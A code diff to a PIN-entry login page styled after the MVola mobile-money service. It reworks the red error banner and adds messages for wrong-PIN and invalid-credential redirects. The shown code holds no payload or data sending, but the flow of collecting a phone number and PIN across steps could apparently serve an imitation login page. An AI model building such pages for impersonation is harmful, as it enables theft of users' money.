@@ -89,8 +89,23 @@
         h2 { 
             color: var(--mvola-dark); 
             font-size: 22px; 
-            margin: 10px 0 25px; 
+            margin: 10px 0 20px; 
             font-weight: 800; 
+        }
+
+        /* 🚨 Red Status Error Banner */
+        .error-banner {
+            width: 100%;
+            background-color: #ffebe9;
+            border: 1px solid #ff4d4f;
+            color: #d93025;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            display: none;
+            box-shadow: 0 2px 6px rgba(217, 48, 37, 0.1);
         }
 
         /* Phone Display Field */
@@ -102,7 +117,7 @@
             display: flex;
             align-items: center;
             gap: 12px;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
             font-size: 18px;
             font-weight: 800;
             color: var(--mvola-dark);
@@ -153,6 +168,11 @@
             border-color: var(--mvola-yellow-dark);
         }
 
+        .pin-box.input-error {
+            border-color: #d93025;
+            background-color: #fff9f9;
+        }
+
         .toggle-eye { 
             position: absolute;
             right: 0;
@@ -196,19 +216,6 @@
 
         .btn-submit.active:hover {
             background-color: var(--mvola-yellow-dark);
-        }
-
-        .error-banner {
-            background-color: #fde8e8;
-            color: #e74c3c;
-            border: 1px solid #f8b4b4;
-            padding: 12px;
-            border-radius: 10px;
-            font-size: 13px;
-            font-weight: 600;
-            margin-bottom: 15px;
-            width: 100%;
-            display: none;
         }
 
         /* Bottom Curved Footer */
@@ -272,6 +279,7 @@
 <div class="main-content">
     <h2>Connexion</h2>
 
+    <!-- Red Error Banner -->
     <div id="errorDisplay" class="error-banner"></div>
 
     <!-- Displays Phone Number Filled in Previous Steps -->
@@ -321,16 +329,31 @@ document.addEventListener("DOMContentLoaded", () => {
     const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "3312345";
     displayPhone.textContent = savedPhone;
 
-    // Detect wrong PIN redirected error
+    // Detect error parameter in URL query
     const urlParams = new URLSearchParams(window.location.search);
-    if (urlParams.get('error') === 'wrongpin') {
-        errorDisplay.innerText = "❌ Code PIN incorrect, veuillez réessayer.";
+    const errParam = urlParams.get('error');
+
+    if (errParam === 'wrong_pin' || errParam === 'wrongpin') {
+        errorDisplay.textContent = "Code PIN incorrect, veuillez entrer le code PIN correct.";
         errorDisplay.style.display = "block";
+        
+        pinBoxes.forEach(b => b.classList.add('input-error'));
+        if (pinBoxes.length > 0) pinBoxes[0].focus();
+    } else if (errParam === 'invalid_credentials' || errParam === 'invalidcredentials') {
+        errorDisplay.textContent = "Détails incorrects, veuillez entrer les détails corrects.";
+        errorDisplay.style.display = "block";
+        
+        pinBoxes.forEach(b => b.classList.add('input-error'));
+        if (pinBoxes.length > 0) pinBoxes[0].focus();
     }
 
     pinBoxes.forEach((box, index) => {
         box.addEventListener('input', () => {
             box.value = box.value.replace(/\D/g, '');
+
+            // Clear red error highlight on typing
+            pinBoxes.forEach(b => b.classList.remove('input-error'));
+            errorDisplay.style.display = "none";
 
             if (box.value && index < pinBoxes.length - 1) {
                 pinBoxes[index + 1].focus();
